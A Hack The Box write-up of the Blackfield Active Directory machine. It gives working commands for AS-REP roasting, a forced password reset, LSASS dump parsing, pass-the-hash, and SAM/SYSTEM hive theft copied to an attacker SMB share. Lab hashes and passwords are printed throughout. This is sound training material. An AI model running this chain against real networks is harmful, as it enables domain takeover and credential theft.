---
title: "Hack The Box - Blackfield - Writeup"
description: "Anonymous SMB enumeration, AS-REP Roasting, ForceChangePassword abuse, LSASS credential extraction, Backup Operators abuse, and privilege escalation on Hack The Box Blackfield."

platform: "Hack The Box"
images: 
  - "/images/blackfield.png"
difficulty: "Hard"
draft: false

tags:
  - HackTheBox
  - Windows
  - Active Directory
  - AS-REP Roasting
  - BloodHound
  - ForceChangePassword
  - LSASS Dump
  - Backup Operators
  - SeBackupPrivilege
  - WinRM

categories:
  - HTB

ShowToc: true
TocOpen: true
ShowReadingTime: false
ShowBreadCrumbs: false
---

{{< section >}}

# Overview

Blackfield is a hard-difficulty Active Directory machine focused on SMB enumeration, Kerberos abuse, BloodHound privilege analysis, credential extraction from LSASS memory dumps, and Backup Operators privilege abuse.

The machine demonstrates how weak Active Directory configurations and excessive privileges can lead to full system compromise.

{{< /section >}}

---

{{< section >}}

# Attack Path Summary

```text
Anonymous SMB Enumeration
            ↓
Username Discovery
            ↓
AS-REP Roasting
            ↓
Offline Password Cracking
            ↓
BloodHound Enumeration
            ↓
ForceChangePassword Abuse
            ↓
Forensic Share Access
            ↓
LSASS Dump Extraction
            ↓
Pass-the-Hash via WinRM
            ↓
Backup Operators Abuse
            ↓
Administrator Hash Extraction
```

{{< /section >}}

---

# Reconnaissance

## Nmap Scan

Initial service enumeration:

```bash
nmap -sVC -Pn -oA nmap/blackfield 10.129.3.93
```

Results:

```text
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

The exposed services strongly suggested that the target was functioning as an Active Directory Domain Controller.

---

## SMB Enumeration

Enumerating SMB shares anonymously:

```bash
smbclient -L //10.129.3.93/
```

Discovered shares:

```text
ADMIN$
C$
forensic
IPC$
NETLOGON
profiles$
SYSVOL
```

Anonymous SMB access was enabled, and the `profiles$` share allowed read access.

Connecting to the share:

```bash
smbclient //10.129.3.93/profiles$
```

Listing contents:

```bash
smb: \> ls
```

More than 300 user profile directories were discovered inside the share.

{{< note >}}

Although the directories were empty, their names could be used as valid domain usernames for further attacks.

{{</ note >}}

---

# Initial Foothold

## AS-REP Roasting

The discovered usernames were saved into `users.txt`.

Using Impacket:

```bash
impacket-GetNPUsers BLACKFIELD.local/ \
-usersfile users.txt \
-no-pass \
-dc-ip 10.129.3.93
```

Successful output:

```text
$krb5asrep$23$support@BLACKFIELD.LOCAL:...
```

The `support` account was configured with Kerberos pre-authentication disabled, making it vulnerable to AS-REP Roasting.

---

## Cracking the Hash

Using Hashcat:

```bash
hashcat -m 18200 user.hash /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```text
support:#00^BlackKnight
```

---

## BloodHound Enumeration

Using BloodHound-Python:

```bash
bloodhound-python \
-u 'support' \
-p '#00^BlackKnight' \
-ns 10.129.3.93 \
-d BLACKFIELD.local \
-c all
```

BloodHound analysis revealed that the `support` user had `ForceChangePassword` rights over the `audit2020` account.

---

## ForceChangePassword Abuse

The `ForceChangePassword` permission allows an attacker to reset another user's password without knowing the current password.

Using BloodyAD:

```bash
bloodyAD --host 10.129.3.93 \
-d BLACKFIELD.local \
-u 'support' \
-p '#00^BlackKnight' \
set password audit2020 'Password123!'
```

```text
[+] Password changed successfully!
```

---

## Forensic Share Enumeration

After compromising `audit2020`, further enumeration revealed access to the `forensic` share.

Inside the share, a `memory_analysis` directory contained an `lsass.zip` archive.

After extracting the archive, an `lsass.DMP` file was recovered.

{{< note >}}

LSASS memory dumps commonly contain plaintext credentials, NTLM hashes, Kerberos tickets, and DPAPI secrets.

{{</ note >}}

---

## LSASS Credential Extraction

Using Pypykatz:

```bash
pypykatz lsa minidump lsass.DMP
```

Recovered credentials:

```text
Username: svc_backup
NT: 9658d1d1dcd9250115e2205d9f48400d
```

Recovered hash:

```text
svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

The recovered NTLM hash could be used for Pass-the-Hash authentication.

---

## WinRM Access

Using Evil-WinRM:

```bash
evil-winrm \
-u 'svc_backup' \
-H '9658d1d1dcd9250115e2205d9f48400d' \
-i BLACKFIELD.local
```

Successful authentication granted shell access as `svc_backup`.

---

# Privilege Escalation

## Backup Operators Abuse

Checking assigned privileges:

```powershell
whoami /priv
```

The `svc_backup` account possessed:

- `SeBackupPrivilege`
- `SeRestorePrivilege`

Additionally, the account was a member of the `Backup Operators` group.

{{< note >}}

Members of the `Backup Operators` group can bypass normal file permissions and back up sensitive system files such as the SAM and SYSTEM registry hives.

{{</ note >}}

---

## Dumping SAM and SYSTEM

Saving registry hives:

```powershell
reg save hklm\sam C:\Windows\Tasks\SAM
reg save hklm\system C:\Windows\Tasks\SYSTEM
```

---

## Transferring Files

Starting an SMB server on the attacker machine:

```bash
impacket-smbserver shared ./ -smb2support
```

Copying files from the target:

```powershell
copy SAM \\10.10.14.208\shared\SAM
copy SYSTEM \\10.10.14.208\shared\SYSTEM
```

---

## Extracting Administrator Hashes

Using Impacket SecretsDump:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Recovered hashes:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
```

The Administrator NTLM hash was successfully extracted through Backup Operators abuse.

---

{{< section >}}

# Skills & Concepts

* SMB Enumeration
* Username Enumeration
* Kerberos Abuse
* AS-REP Roasting
* Offline Password Cracking
* BloodHound Privilege Analysis
* ForceChangePassword Abuse
* LSASS Credential Extraction
* Pass-the-Hash
* Backup Operators Abuse
* SeBackupPrivilege Abuse
* Active Directory Privilege Escalation

{{< /section >}}

---

{{< section >}}

# Tools Used

* Nmap
* smbclient
* Impacket
* Hashcat
* BloodHound
* BloodHound-Python
* BloodyAD
* Pypykatz
* Evil-WinRM

{{< /section >}}

---

# Lessons Learned

Blackfield demonstrates how multiple small Active Directory weaknesses can be chained together into full compromise:

- Anonymous SMB enumeration exposed valid usernames
- Kerberos misconfiguration enabled AS-REP Roasting
- Weak passwords allowed offline cracking
- Excessive ACL permissions enabled ForceChangePassword abuse
- Sensitive forensic artifacts leaked LSASS credentials
- Backup Operators privileges enabled extraction of Administrator hashes

The machine highlights the dangers of privilege delegation and insecure credential handling in enterprise Active Directory environments.

---